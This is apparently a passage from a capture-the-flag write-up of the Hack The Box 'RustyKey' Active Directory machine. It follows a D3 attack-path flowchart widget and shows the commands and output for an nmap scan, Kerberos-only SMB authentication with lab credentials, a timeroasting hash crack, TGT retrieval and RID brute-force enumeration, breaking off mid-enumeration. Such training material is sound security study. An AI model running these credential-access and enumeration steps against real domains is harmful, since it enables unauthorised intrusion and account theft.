+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+
+<style>
+.attack-path-flowchart {
+  width: 100%;
+  height: 500px;
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flowchart-controls {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 5px;
+}
+
+.zoom-btn {
+  width: 32px;
+  height: 32px;
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s ease;
+}
+
+.zoom-btn:hover {
+  background: rgba(0, 0, 0, 0.9);
+  border-color: rgba(255, 255, 255, 0.4);
+}
+
+.flowchart-svg {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  cursor: grab;
+}
+
+.flowchart-svg:active {
+  cursor: grabbing;
+}
+
+.flowchart-node {
+  cursor: pointer;
+}
+
+.flowchart-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 36px;
+  text-anchor: middle;
+  dominant-baseline: central;
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-image {
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-text {
+  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  text-anchor: middle;
+  pointer-events: none;
+  user-select: none;
+  fill: #ddd;
+}
+
+.flowchart-arrow {
+  stroke: rgba(255, 255, 255, 0.4);
+  stroke-width: 1.5px;
+  transition: all 0.2s ease-in-out;
+}
+
+.flowchart-arrow.glow {
+  stroke: rgba(255, 255, 255, 1);
+  stroke-width: 2.5px;
+  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
+}
+
+.flowchart-arrow-marker {
+  fill: rgba(255, 255, 255, 0.6);
+}
+
+.flowchart-pin-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 16px;
+  fill: #DC143C;  
+  text-anchor: middle;
+  dominant-baseline: central;
+  display: none;  
+  pointer-events: none;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
+}
+
+
+ 
+.node-recon .flowchart-icon { color: #A0522D; }  
+.node-enum .flowchart-icon { color: #4169E1; }  
+.node-exploit .flowchart-icon { color: #DC143C; }  
+.node-access .flowchart-icon { color: #2E8B57; }  
+.node-privesc .flowchart-icon { color: #FF8C00; }  
+.node-root .flowchart-icon { color: #FFD700; }  
+.node-default .flowchart-icon { color: #A9A9A9; }  
+</style>
+
+<script>
+(function() {
+  
+  "use strict";
+
+  let flowchartInstances = {};
+
+  const iconMap = {
+    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
+    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
+    pin: '\uf08d',
+  };
+
+  function initFlowcharts() {
+    const containers = document.querySelectorAll('.attack-path-flowchart');
+    containers.forEach(container => {
+      if (container.dataset.initialized) return;
+      container.dataset.initialized = 'true';
+
+      const id = container.id;
+      const dataDiv = container.querySelector('.flowchart-data');
+      if (dataDiv) {
+        const steps = parseSteps(dataDiv.textContent);
+        if (steps.length > 0) {
+          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
+          setupControls(container, id);
+        }
+      }
+    });
+  }
+
+  function setupControls(container, id) {
+    const instance = flowchartInstances[id];
+    if (!instance) return;
+    container.querySelectorAll('.zoom-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const action = btn.getAttribute('data-action');
+        if (action === 'zoom-in') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
+        } else if (action === 'zoom-out') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
+        } else if (action === 'reset') {
+          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
+        }
+      });
+    });
+  }
+
+  function parseSteps(content) {
+    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      line = line.replace(/^[-*]\s*/, '');
+      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
+      const match = line.match(imgRe);
+      const text = match ? match[2].trim() : line;
+      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
+    });
+  }
+
+  function getStepType(text) {
+    const l = text.toLowerCase();
+    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
+    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
+    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
+    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
+    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
+    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
+    return 'default';
+  }
+
+  function createInteractiveFlowchart(container, nodesData) {
+    const W = container.clientWidth, H = container.clientHeight;
+    const svg = d3.select(container).append('svg')
+                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);
+
+    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));
+
+    svg.call(zoom);
+    const g = svg.append('g');
+
+    const defs = svg.append('defs');
+    defs.append('marker')
+        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
+        .attr('refX', 25).attr('refY', 0)
+        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
+      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');
+
+    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];
+
+    const arrows = g.append("g").selectAll("line")
+      .data(links).enter().append("line")
+      .attr("class", "flowchart-arrow")
+      .attr("marker-end", "url(#arrowhead)");
+
+    const nodeGroups = g.append("g").selectAll(".flowchart-node")
+      .data(nodesData, d => d.id).enter().append("g")
+      .attr("class", d => 'flowchart-node node-' + d.type);
+
+    nodeGroups.each(function(d) {
+      const node = d3.select(this);
+      if (d.imageUrl) {
+        node.append('image')
+          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
+          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
+          .on('error', function() {
+            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
+            d3.select(this).remove();
+          });
+      } else {
+        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
+      }
+    });
+
+    nodeGroups.append('text')
+      .attr('class', 'flowchart-pin-icon')
+      .attr('x', 20)
+      .attr('y', -20)
+      .text(iconMap.pin);
+
+    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
+      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
+    nodeGroups.append('title').text(d => d.text);
+
+    const numNodes = nodesData.length;
+    const padding = 120;
+    const nodeRadius = 40;
+
+    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);
+
+    const simulation = d3.forceSimulation(nodesData)
+        .force("link", linkForce)
+        .force("charge", d3.forceManyBody().strength(-600))
+        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
+        .force("x", d3.forceX(d => {
+            if (numNodes <= 1) return W / 2;
+            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
+        }).strength(0.4))
+        .force("y", d3.forceY(d => {
+            if (numNodes <= 1) return H / 2;
+            const amplitude = H * 0.20;
+            const frequency = Math.PI;
+            const centerY = H / 2;
+            const phase = (d.id / (numNodes - 1)) * frequency;
+            return centerY - amplitude * Math.cos(phase);
+        }).strength(0.5))
+        .on("tick", () => {
+          arrows
+              .attr("x1", d => d.source.x)
+              .attr("y1", d => d.source.y)
+              .attr("x2", d => d.target.x)
+              .attr("y2", d => d.target.y);
+          nodeGroups
+              .attr("transform", d => `translate(${d.x},${d.y})`);
+        });
+
+    const dragHandler = d3.drag()
+        .on("start", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0.3).restart();
+            d.fx = d.x;
+            d.fy = d.y;
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', true);
+            linkForce.strength(0); 
+        })
+        .on("drag", function (event, d) {
+            d.fx = event.x;
+            d.fy = event.y;
+        })
+        .on("end", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0);
+            
+            linkForce.strength(0.2); 
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', false);
+
+            d.pinned = true;
+            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
+        });
+
+    nodeGroups
+      .call(dragHandler)
+      .on('mouseover', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', true);
+      })
+      .on('mouseout', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', false);
+      })
+      .on('contextmenu', function(event, d) {
+        event.preventDefault();
+        
+        if (d.pinned) {
+          d.pinned = false;
+          d.fx = null; 
+          d.fy = null;
+          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
+          simulation.alpha(0.3).restart(); 
+        }
+      });
+
+    return { svg, zoom, g };
+  }
+
+  function wrapText(textElem, str, maxW) {
+    const words = str.split(/\s+/), lineHeight = 12, x = 0;
+    textElem.text(null);
+    let line = [], tspan = textElem.append('tspan').attr('x', x);
+    for (const word of words) {
+        line.push(word);
+        tspan.text(line.join(' '));
+        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
+            line.pop();
+            tspan.text(line.join(' '));
+            line = [word];
+            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
+        }
+    }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initFlowcharts);
+  } else {
+    initFlowcharts();
+  }
+})();
+</script>
+
+<hr>
+<h1 id="initial-access-ta0001">Initial Access (TA0001)<a hidden class="anchor" aria-hidden="true" href="#initial-access-ta0001">#</a></h1>
+<h3 id="reconnaissance-ta0043">Reconnaissance (TA0043)<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-ta0043">#</a></h3>
+<p>As always, I started with an <code>nmap</code> scan to see what services were running on the target.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/rustykey 10.10.11.75 <span class="flag">-vv</span>
+# Nmap 7.95 scan initiated Sun Jun 29 08:19:57 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/rustykey <span class="flag">-vv</span> 10.10.11.75
+Nmap scan report for dc (10.10.11.75)
+Host is up, received reset ttl 127 (0.056s latency).
+Scanned at 2025-06-29 08:19:57 EDT for 20s
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-29 12:20:04Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 127
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped    syn-ack ttl 127
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 51928/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 27628/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 63867/udp): CLEAN (Timeout)
+|   Check 4 (port 46581/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-06-29T12:20:08
+|_  start_date: N/A
+|_clock-skew: <span class="flag">-1s</span>
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jun 29 08:20:17 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 20.55 seconds
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The scan revealed multiple open ports, many of which are typical for an Active Directory Domain Controller.</p>
+<ul>
+<li>
+<p><strong>Ports 88, 389, 445, 3268/3269:</strong> Standard AD services (Kerberos, LDAP, SMB).</p>
+</li>
+<li>
+<p><strong>Port 5985:</strong> WinRM is available.</p>
+</li>
+<li>
+<p><strong>Domain:</strong> <code>rustykey.htb</code></p>
+</li>
+</ul>
+<p>The next step is to add <code>rustykey.htb</code> to my <code>/etc/hosts</code> file.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.11.75 rustykey.htb"</span> | sudo tee <span class="flag">-a</span> /etc/hosts
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="time-synchronization-for-kerberos">Time Synchronization for Kerberos<a hidden class="anchor" aria-hidden="true" href="#time-synchronization-for-kerberos">#</a></h3>
+<p>Since we&rsquo;re dealing with Active Directory, our system time needs to be synchronized with the domain controller to avoid Kerberos authentication issues. A time skew can cause Kerberos to reject our tickets.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> systemctl stop systemd-timesyncd.service
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> ntpdate 10.10.11.75
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="active-directory-discovery-ta0007">Active Directory Discovery (TA0007)<a hidden class="anchor" aria-hidden="true" href="#active-directory-discovery-ta0007">#</a></h3>
+<p>I started by checking if I could access any SMB shares with the provided credentials.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb 10.10.11.75 <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> 
+<span class="smb">SMB</span>         10.10.11.75     445    10.10.11.75      <span class="indicator-info">[*]</span>  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         10.10.11.75     445    10.10.11.75      <span class="indicator-error">[-]</span> 10.10.11.75\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The <code>STATUS_NOT_SUPPORTED</code> error suggests that NTLM authentication might be disabled. I switched to Kerberos authentication using the <code>-k</code> flag.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb 10.10.11.75 <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> <span class="flag">-k</span>     
+<span class="smb">SMB</span>         10.10.11.75     445    10.10.11.75      <span class="indicator-info">[*]</span>  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         10.10.11.75     445    10.10.11.75      <span class="indicator-error">[-]</span> 10.10.11.75\rr.parker:8#t5HE8L!W3A KDC_ERR_WRONG_REALM 
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb rustykey.htb <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> <span class="flag">-k</span>
+<span class="smb">SMB</span>         rustykey.htb    445    rustykey         <span class="indicator-info">[*]</span>  x64 (name:rustykey) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         rustykey.htb    445    rustykey         <span class="indicator-error">[-]</span> htb\rr.parker:8#t5HE8L!W3A [Errno Connection error (HTB:88)] [Errno <span class="flag">-2</span>] Name or service not known
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>This time, I got a <code>KDC_ERR_WRONG_REALM</code> error. This usually happens when the client can&rsquo;t find the correct Kerberos realm for the target. Using the hostname <code>rustykey.htb</code> might fix this, but it led to a different connection error. This suggests a DNS issue; the system doesn&rsquo;t know the Fully Qualified Domain Name (<code>FQDN</code>) of the DC.</p>
+<p>I used <code>nslookup</code> to find the FQDN.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nslookup</span> 
+> server 10.10.11.75
+Default server: 10.10.11.75
+Address: 10.10.11.75#53
+> 127.0.0.1
+1.0.0.127.in-addr.arpa  name = localhost.
+> 10.10.11.75
+;; communications error to 10.10.11.75#53: timed out
+dc;; communications error to 10.10.11.75#53: timed out
+;; communications error to 10.10.11.75#53: timed out
+;; no servers could be reached
+> rustykey.htb
+Server:         10.10.11.75
+Address:        10.10.11.75#53
+
+Name:   rustykey.htb
+Address: 10.10.11.75
+dName:  rustykey.htb
+Address: dead:beef::edd:dcc8:14fa:512c
+Name:   rustykey.htb
+Address: dead:beef::1ab
+Name:   rustykey.htb
+Address: dead:beef::74af:71cc:d5e3:9919
+> dc.rustykey.htb
+Server:         10.10.11.75
+Address:        10.10.11.75#53
+
+Name:   dc.rustykey.htb
+Address: 10.10.11.75
+Name:   dc.rustykey.htb
+Address: dead:beef::edd:dcc8:14fa:512c
+> dc01.rustykey.htb
+Server:         10.10.11.75
+Address:        10.10.11.75#53
+
+** server can't find dc01.rustykey.htb: NXDOMAIN
+
+...
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>By trying common hostnames like <code>dc</code>, I confirmed that the FQDN is <code>dc.rustykey.htb</code>. I added this to my <code>/etc/hosts</code> file and ran <code>netexec</code> again.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb dc.rustykey.htb <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> <span class="flag">-k</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-info">[*]</span>  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-success">[+]</span> rustykey.htb\rr.parker:8#t5HE8L!W3A 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-info">[*]</span> Enumerated shares
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="row-header">Share           Permissions     Remark</span>
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="flag">-----</span>           <span class="flag">-----------</span>     <span class="flag">------</span>
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               C$                              Default share
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Success! The shares are just the default ones, but we have confirmed our credentials and access. To make future Kerberos authentication smoother, I generated a <code>krb5.conf</code> file and moved it to <code>/etc/</code>:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb dc.rustykey.htb <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> <span class="flag">-k</span> <span class="flag">--generate-krb5-file</span> rustykey.krb
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-info">[*]</span>  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-success">[+]</span> rustykey.htb\rr.parker:8#t5HE8L!W3A 
+
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cat</span> rustykey.krb                                                                        
+
+[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = RUSTYKEY.HTB
+
+[realms]
+    RUSTYKEY.HTB = {
+        kdc = dc.rustykey.htb
+        admin_server = dc.rustykey.htb
+        default_domain = rustykey.htb
+    }
+
+[domain_realm]
+    .rustykey.htb = RUSTYKEY.HTB
+    rustykey.htb = RUSTYKEY.HTB
+    
+    
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> cp rustykey.krb /etc/krb5.conf 
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<hr>
+<h1 id="credential-access-ta0006">Credential Access (TA0006)<a hidden class="anchor" aria-hidden="true" href="#credential-access-ta0006">#</a></h1>
+<h3 id="timeroasting-t1558004">Timeroasting (T1558.004)<a hidden class="anchor" aria-hidden="true" href="#timeroasting-t1558004">#</a></h3>
+<p>I got stuck for a bit after running all the usual enumeration scripts without any hits. I decided to take a break, <code>touch some grass</code>, and do some research. I came across a cool article on Medium about a <code>Timeroasting</code> attack: <a href="https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac" title="null">Targeted TimeRoasting</a>.</p>
+<p>The TL;DR is that the NTP protocol can leak Net-NTLMv1 hashes from machine accounts. These hashes are notoriously weak and can often be cracked easily.</p>
+<p>I used <code>ntproast</code> to perform the attack and got a hash.</p>
+<p><img alt="Image" loading="lazy" src="https://github.com/user-attachments/assets/ad389c17-a2bc-426b-bdc5-287e26d22e89"></p>
+<p>Then, I cracked it with <code>ntpcrack:</code></p>
+<p><img alt="Image" loading="lazy" src="https://github.com/user-attachments/assets/713673ab-294a-492d-8a65-b0a35d903d61"></p>
+<h3 id="password-spraying-t1110003">Password Spraying (T1110.003)<a hidden class="anchor" aria-hidden="true" href="#password-spraying-t1110003">#</a></h3>
+<p>The cracked password is <code>Rusty88!</code>. Now I needed to figure out which account this password belongs to. I decided to enumerate all domain users and computer accounts and then spray this password against the list.</p>
+<p>First, I got a Ticket Granting Ticket (TGT) for <code>rr.parker</code> to authenticate for further enumeration.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getTGT.py</span> rustykey.htb/rr.parker:'8#t5HE8L!W3A'        
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Saving ticket in rr.parker.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Then I exported the ticket so my tools could use it.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">export</span> KRB5CCNAME=$(pwd)/rr.parker.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Next, I used <code>netexec</code> with the <code>--rid-brute</code> flag to enumerate all objects in the domain, including users and computer accounts.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb dc.rustykey.htb <span class="flag">-u</span> <span class="string">'rr.parker'</span> <span class="flag">-p</span> <span class="string">'8#t5HE8L!W3A'</span> <span class="flag">-k</span> <span class="flag">--rid-brute</span>
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-info">[*]</span>  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-success">[+]</span> rustykey.htb\rr.parker:8#t5HE8L!W3A
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)
